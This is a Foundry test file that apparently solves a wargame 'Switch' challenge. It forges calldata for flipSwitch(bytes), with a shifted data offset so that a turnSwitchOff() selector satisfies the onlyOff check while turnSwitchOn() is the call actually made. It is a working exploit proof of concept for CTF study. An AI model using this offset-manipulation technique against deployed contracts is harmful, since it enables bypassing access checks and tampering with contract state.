// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Switch} from "../src/Switch.sol";

contract SwitchTest is Test {
    Switch public switchContract;

    // Create test addresses
    address ownerSwitch = makeAddr("ownerSwitch");
    address Attacker = makeAddr("Attacker");

    function setUp() public {
        vm.prank(ownerSwitch);
        switchContract = new Switch();
    }

    function test_attack() public {
        assertEq(switchContract.switchOn(), false);

        // bytes memory _calldata =
        // hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        // Same, but programmatically generated:
        bytes memory _calldata = abi.encodePacked(
            bytes4(keccak256("flipSwitch(bytes)")), // selector of "flipSwitch(bytes)"
            bytes32(uint256(96)), // our modified data offset
            bytes32(0), // padding
            bytes32(bytes4(keccak256("turnSwitchOff()"))), // selector of "turnSwitchOff()" to pass the "onlyOff" modifier
            bytes32(uint256(4)), // byte stream length
            bytes32(bytes4(keccak256("turnSwitchOn()"))) // selector of "turnSwitchOn()" that would be called in "flipSwitch(bytes)"
        );

        console.logBytes(_calldata);
        (bool success, bytes memory err) = address(switchContract).call(_calldata);

        require(success, string(err));
        assertEq(switchContract.switchOn(), true);
    }
}
